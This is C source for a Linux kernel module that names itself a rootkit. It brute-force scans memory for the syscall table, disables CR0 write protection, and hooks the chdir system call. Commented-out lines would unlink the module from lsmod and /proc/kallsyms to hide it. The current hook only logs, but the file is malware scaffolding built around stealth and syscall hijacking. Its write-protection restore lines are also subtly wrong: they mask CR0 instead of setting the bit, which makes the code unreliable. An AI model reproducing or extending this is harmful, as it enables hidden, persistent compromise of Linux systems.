#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <asm/unistd.h>

#if defined(__386__)
#define SYSCALL_TABLE_START 0xc0000000
#define SYSCALL_TABLE_STOP 0xd0000000
typedef unsigned int pointer_size_t;
#else
#define SYSCALL_TABLE_START 0xffffffff81000000l
#define SYSCALL_TABLE_STOP 0xffffffffa2000000l
typedef unsigned long pointer_size_t;
#endif

unsigned long **syscall_table;

asmlinkage int (*original_chdir)(const char __user *path);

asmlinkage int my_chdir(const char __user *path)
{
	printk("Hijacked chdir call\n");
	int err = original_chdir(path);
	return err;
}

pointer_size_t **find_syscall_table(void)
{
	pointer_size_t i;
	pointer_size_t **table;
	for (i = SYSCALL_TABLE_START; i < SYSCALL_TABLE_STOP; i += sizeof(void *)) {
		table = (pointer_size_t **) i;
		if ( table[__NR_close] == (pointer_size_t *) sys_close)
			return &table[0];
	}
	return NULL;
}




int rootkit_init(void)
{
	printk("Rootkit loaded\n");
	
	/* Uncomment the following lines after completion of module 
	 * Can't rmmod it if we have it uncommented during dev
	 * That's just cumbersome during dev
	 */
	
	/*
	// stop from showing on lsmod
	list_del_init(&__this_module.list);

	// stop showing in /proc/kallsyms
	kobject_del(&THIS_MODULE->mkobj.kobj);
	*/
	
	syscall_table = find_syscall_table();
	if (!syscall_table) {
		goto out;	
	}

	printk("Syscall table at %p\n", syscall_table);
	
	// make writable by disabling write protect
	write_cr0(read_cr0() & (~0x10000));

	// hijack write system call
	original_chdir = syscall_table[__NR_chdir];
	syscall_table[__NR_chdir] = my_chdir;


	// enable write protected
	write_cr0(read_cr0() & 0x10000);


	out:
	return 0;
}

void rootkit_exit(void)
{
	write_cr0(read_cr0() & (~0x10000));
	syscall_table[__NR_chdir] = original_chdir;
	write_cr0(read_cr0() & 0x10000);
	printk("Rootkit unloaded\n");
}


MODULE_LICENSE("GPL");
MODULE_AUTHOR("BufferOverflowers");
module_init(rootkit_init);
module_exit(rootkit_exit);
